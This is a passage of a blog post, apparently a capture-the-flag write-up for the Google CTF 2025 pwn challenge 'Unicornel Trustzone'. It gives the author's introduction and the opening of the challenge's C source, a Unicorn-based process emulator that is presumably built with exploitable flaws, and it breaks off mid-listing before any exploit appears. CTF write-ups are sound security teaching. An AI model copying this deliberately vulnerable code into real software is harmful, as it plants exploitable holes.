<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Google CTF 2025 - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://chovid99.github.io/C99-web-card.png">
  <meta name="twitter:title" content="Google CTF 2025">
  <meta name="twitter:description" content="Writeup for Google CTF 2025 by Chovid99">
      <meta name="twitter:site" content="@Chovid99">
<meta property="og:url" content="https://chovid99.github.io/posts/google-ctf-2025/">
  <meta property="og:site_name" content="Chovid99&#39;s Blog">
  <meta property="og:title" content="Google CTF 2025">
  <meta property="og:description" content="Writeup for Google CTF 2025 by Chovid99">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-07-01T21:12:16+07:00">
    <meta property="article:modified_time" content="2025-07-01T21:12:16+07:00">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="Google CTF">
    <meta property="article:tag" content="Pwn">
    <meta property="article:tag" content="Unicorn">
    <meta property="article:tag" content="2025">
    <meta property="og:image" content="https://chovid99.github.io/C99-web-card.png">
<meta name="application-name" content="Chovid99&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://chovid99.github.io/posts/google-ctf-2025/" /><link rel="prev" href="https://chovid99.github.io/posts/greyctf-2025/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="9bWYU2tJlhINPHANaxcXkK63aSnxvqj7GHrr_r5tb9s" /><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Google CTF 2025",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/chovid99.github.io\/posts\/google-ctf-2025\/"
        },"image": ["https:\/\/chovid99.github.io\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, Google CTF, pwn, unicorn, 2025","wordcount":  7854 ,
        "url": "https:\/\/chovid99.github.io\/posts\/google-ctf-2025\/","datePublished": "2025-07-01T21:12:16+07:00","dateModified": "2025-07-01T21:12:16+07:00","publisher": {
            "@type": "Organization",
            "name": "Chovid99","logo": "https:\/\/chovid99.github.io\/C99-Black3.png"},"author": {
                "@type": "Person",
                "name": "Author"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                
                
            </a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Google CTF 2025</h1><div class="post-meta">
            <div class="post-meta-line">
                </div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Jul 01, 2025">Jul 01, 2025</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;7854 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;37 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#pwn">Pwn</a>
      <ul>
        <li><a href="#unicornel-trustzone">Unicornel Trustzone</a>
          <ul>
            <li><a href="#initial-analysis">Initial Analysis</a></li>
            <li><a href="#solution">Solution</a>
              <ul>
                <li><a href="#leak-password-and-trustzones">Leak Password and Trustzones</a></li>
                <li><a href="#leak-shared-buffers">Leak Shared Buffers</a></li>
                <li><a href="#leak-pie-and-rwx">Leak PIE and RWX</a></li>
                <li><a href="#gain-remote-code-execution">Gain Remote Code Execution</a></li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#social-media">Social Media</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><figure><a class="lightgallery" href="https://i.imgur.com/TfyqNVK.png" title="https://i.imgur.com/TfyqNVK.png" data-thumbnail="https://i.imgur.com/TfyqNVK.png" data-sub-html="<h2>Google CTF 2025</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="https://i.imgur.com/TfyqNVK.png"
            data-srcset="https://i.imgur.com/TfyqNVK.png, https://i.imgur.com/TfyqNVK.png 1.5x, https://i.imgur.com/TfyqNVK.png 2x"
            data-sizes="auto"
            alt="https://i.imgur.com/TfyqNVK.png" />
    </a><figcaption class="image-caption">Google CTF 2025</figcaption>
    </figure>
<p>Hi everyone! Life has been quite hectic this year, and looking back, I noticed I&rsquo;ve only published one blog post in 2025 so far. This realization made me a bit sad, as I really enjoy sharing my CTF experiences through writeups. The fact is, I can probably count the number of CTFs I&rsquo;ve participated in this year on just one hand, which means I don&rsquo;t even really play CTFs anymore (which is why I rarely write in this blog). I&rsquo;m hoping to get back to writing more regularly when time permits.</p>
<p>During Google CTF this year, my schedule was pretty tight, so I couldn&rsquo;t contribute much to my team <strong>Blue Water</strong>. I only managed to look at two challenges, which are unicornel trustzone and webz. While I solved unicornel trustzone, I unfortunately didn&rsquo;t have enough time to tackle webz properly. That said, webz was a fascinating challenge that I&rsquo;d love to revisit and solve when I get some free time.</p>
<p>So, this time, I will share my writeup for the unicornel trustzone challenge.</p>
<h1 id="pwn">Pwn</h1>
<h2 id="unicornel-trustzone">Unicornel Trustzone</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>Unicornel was broken, on that we will concur</p>
<p>But I&rsquo;ve removed all of the bugs now, I am quite sure</p>
<p>Author: roguebantha</p>
</div>
        </div>
    </div>
<h3 id="initial-analysis">Initial Analysis</h3>
<p>In this challenge, we were given a zip file containing two main files: <code>chal.c</code> and <code>syscalls.c</code>. Let&rsquo;s first take a look at <code>chal.c</code> to understand what the application is trying to do.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define _GNU_SOURCE
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;poll.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;unicorn/unicorn.h&#34;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;unicornel.h&#34;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">pthread_mutex_t</span> <span class="n">task_lock</span> <span class="o">=</span> <span class="n">PTHREAD_MUTEX_INITIALIZER</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">pollfd</span> <span class="n">pfds</span><span class="p">[</span><span class="n">MAX_PROCESSES</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">processes</span><span class="p">[</span><span class="n">MAX_PROCESSES</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="n">next_pid</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">ARG_REGR</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">,</span><span class="kt">unsigned</span> <span class="n">reg</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">_</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">uc_reg_read</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">,</span><span class="n">call_regs</span><span class="p">[</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">arch</span><span class="p">][</span><span class="n">reg</span><span class="p">],</span><span class="o">&amp;</span><span class="n">_</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">_</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">ARG_REGW</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">,</span><span class="kt">unsigned</span> <span class="n">reg</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">uc_reg_write</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">,</span><span class="n">call_regs</span><span class="p">[</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">arch</span><span class="p">][</span><span class="n">reg</span><span class="p">],</span><span class="o">&amp;</span><span class="n">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">hook_call</span><span class="p">(</span><span class="n">uc_engine</span><span class="o">*</span> <span class="n">uc</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">intno</span><span class="p">,</span> <span class="kt">void</span><span class="o">*</span> <span class="n">user_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span> <span class="o">=</span> <span class="n">user_data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">syscall_no</span> <span class="o">=</span> <span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">&#34;pid %d: syscall with value %lu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">,</span><span class="n">syscall_no</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fflush</span><span class="p">(</span><span class="n">stderr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">syscall_no</span> <span class="o">==</span> <span class="mh">0xff</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//Loop detected - let me save us all some blushes and just stop
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">uc_emu_stop</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="c1">//Check for OOB syscall number?
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="n">syscall_no</span> <span class="o">&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ARG_REGW</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0xff</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">syscalls</span><span class="p">[</span><span class="n">syscall_no</span><span class="p">](</span><span class="n">current</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">ARG_REGW</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">ret</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//Must be holding task lock
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">destroy_process</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1">//If this happens something has gone terribly wrong in our bookkeeping. Panic.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="n">processes</span><span class="p">[</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">]</span> <span class="o">!=</span> <span class="n">current</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">abort</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="n">processes</span><span class="p">[</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">trusted_zone_hook</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">uc_hook_del</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">,</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">trusted_zone_hook</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">uc_close</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">close</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">outfd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">free</span><span class="p">(</span><span class="n">current</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span><span class="o">*</span> <span class="nf">process_thread</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span> <span class="n">param</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span> <span class="o">=</span> <span class="n">param</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">uc_err</span> <span class="n">e</span> <span class="o">=</span> <span class="nf">uc_emu_start</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">,</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">entrypoint</span><span class="p">,</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">entrypoint</span> <span class="o">+</span> <span class="n">current</span><span class="o">-&gt;</span><span class="n">code_length</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ip</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">uc_reg_read</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">,</span><span class="n">ip_reg</span><span class="p">[</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">arch</span><span class="p">],</span><span class="o">&amp;</span><span class="n">ip</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Process %u finished with status %s at address %lu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,(</span><span class="kt">unsigned</span><span class="p">)</span> <span class="n">current</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">,</span><span class="nf">uc_strerror</span><span class="p">(</span><span class="n">e</span><span class="p">),</span><span class="n">ip</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">pthread_mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">destroy_process</span><span class="p">(</span><span class="n">current</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">pthread_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">pthread_exit</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//Must be holding task lock
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">find_free_process</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">MAX_PROCESSES</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* We check pfds here to avoid a race between destroy_process ending a task and the
</span></span></span><span class="line"><span class="cl"><span class="cm">      main poll thread reaping the read end of the pipe
</span></span></span><span class="line"><span class="cl"><span class="cm">    */</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">processes</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">pfds</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">start_process</span><span class="p">()</span> 
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">pthread_mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="nf">find_free_process</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">pid</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;At max processes already</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
